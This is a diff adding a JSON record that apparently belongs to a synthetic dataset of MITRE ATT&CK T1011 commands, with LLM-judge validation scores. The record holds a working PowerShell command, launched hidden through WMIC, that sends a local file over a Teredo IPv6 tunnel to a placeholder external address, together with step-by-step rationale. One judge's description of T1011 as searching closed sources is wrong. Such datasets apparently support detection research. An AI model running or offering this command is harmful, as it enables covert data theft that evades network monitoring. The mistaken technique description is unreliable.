@@ -1,0 +1,49 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*Teredo*') }; if(`$ifc){ `$ip6=@(`$ifc.IPAddress | ?{ `$_ -like '*:*' })[0]; if(`$ip6){ `$c=New-Object Net.Sockets.TcpClient([Net.Sockets.AddressFamily]::InterNetworkV6); `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip6),0))); `$rv6=[Net.IPAddress]::Parse('2001:db8::50'); `$c.Connect(`$rv6,53456); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\ProgramData\\Diagnostics\\etl.bin'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
+  "explanation": "Starts a hidden PowerShell via WMIC that binds an IPv6 TCP client to the Teredo tunneling interface and exfiltrates a file to an IPv6 address on a high port. This uses an IPv6 tunnel as an alternate medium in line with T1011.",
+  "rationale_steps": [
+    "Query for the Teredo tunneling adapter and obtain its IPv6 address.",
+    "Create an IPv6 TCP client and bind it to the Teredo-local address.",
+    "Connect to an IPv6 external host on an uncommon port.",
+    "Stream file data through the Teredo path, separate from primary IPv4 LAN.",
+    "Limit scope to the process, avoiding global network changes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-987933e0-e336a109",
+  "source_prompt_hash": "987933e0",
+  "timestamp_utc": "2025-09-30T08:13:32.291694Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with properly balanced quotes, backticks, parentheses, and braces, correct PowerShell syntax with appropriate escape sequences, and valid WMIC process call create parameters.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does implement exfiltration over an alternative protocol (IPv6 Teredo tunneling) which aligns with the concept of using non-standard channels, it doesn't actually search closed sources or query non-public information as described in T1011.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T14:06:38.037664Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command and PowerShell are well-formed with balanced quoting, valid parameters, and acceptable backtick escapes for $ variables and single-quoted literals.",
+        "semantic_score": 4,
+        "semantic_justification": "It plausibly launches hidden PowerShell, binds an IPv6 TcpClient to a Teredo address, and sends file bytes to a remote IPv6 endpoint (alternate medium), though the example IPv6 (2001:db8::/32) is non-routable which reduces operational realism.",
+        "combined_score": 4.5,
+        "confidence": 0.78,
+        "timestamp": "2025-10-02T14:08:17.426407Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.5,
+    "llm_average_score": 4.25,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
